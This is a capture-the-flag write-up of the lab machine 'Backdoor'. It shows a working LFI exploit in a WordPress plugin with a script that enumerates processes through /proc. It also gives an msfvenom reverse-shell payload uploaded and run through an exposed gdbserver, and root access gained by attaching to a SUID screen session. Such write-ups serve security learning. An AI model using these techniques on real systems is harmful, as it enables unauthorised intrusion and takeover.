## Summary
This box includes a unique way of enumerating a machine through an LFI by fuzzing for a specific PID that spawned a service on port 1337. At least I hadn't seen it before trying it. The privesc step however is rather straight forward.

## Foothold
Let's start of with an nmap scan.
```console
# Nmap 7.92 scan initiated Sat Nov 20 14:36:07 2021 as: nmap -sC -sV --open -p- -oA nmap_scans/scan_full 10.129.102.115

Based on the nmap scan we can conclude that it is using Wordpress. Since this is a wordpress site it is usually a good idea to check which plugins are used. this can be done by checking the /wp-content/plugins directory. We quickly learn that a plugin named ebook-download 1.1 is installed. Searching for exploits related to this leads to the following poc on exploit-db:
<https://www.exploit-db.com/exploits/39575>

It's a very simple poc. Basically we can use the ebook-download plugin to download local files from the server granting us LFI.

Before we continue it might be a good idea to learn what service is running on port 1337. I wrote a very simple script 

```python
import requests

target = '/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{}/cmdline'

url = 'http://10.129.107.129'

for i in range(1000):
        r = requests.get(url + target.format(i))
        result = r.text.split("cmdline")[3].split("<script>")[0]
        if result == '':
                continue
        else:
                print(r.text.split("cmdline")[3].split("<script>")[0] + '\n')

```

The script simply automates the process of getting the cmdline which initiated the process associated with the pid in the url. We don't know what pids are found in the /proc folder on the target system, so I just used a for-loop and printed all non-empty results. 

Running this script gives us the following results (among others):
```console
/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

Based on this it seems that there is a gdb server on port 1337

To exploit this we can create a reverse shell by using msfvenom: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf -o rev.elf`

we can then connect to the gdb server by using gdb:

```console
gdb
target extended-remote IP:PORT
remote put rev.elf rev.elf
set remote exec-file /home/user/rev.elf
show remote exec-file
run
```

The above commands start by connecting to the GDB server. After this the `rev.elf`{: .filepath} file is sent to the server with the same name. The file is then chosen to be run and then executed. When the file is run we of course get a reverse shell on the target system.

To get a more stable shell we simply use wget to get the id_rsa.pub file from our own system. We then rename this file to authorized_keys on the target system and connect via ssh:

## Privilege escalation

We start out by finding SUID binaries.
```console
user@Backdoor:~$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

screen is set as a SUID binary.

```console
ser@Backdoor:~$ ls -laR /var/run/screen
/var/run/screen:
total 0
drwxr-xr-x  4 root utmp  80 Jun 13 14:43 .
drwxr-xr-x 25 root root 760 Jun 13 14:40 ..
drwx------  2 root root  60 Jun 13 14:04 S-root
drwx------  2 user user  40 Jun 13 14:43 S-user
ls: cannot open directory '/var/run/screen/S-root': Permission denied
```
Based on this output there is a screen session running as root. To switch to this session we can use the -x flag:
```console
screen -x root/root
```
and rooted!
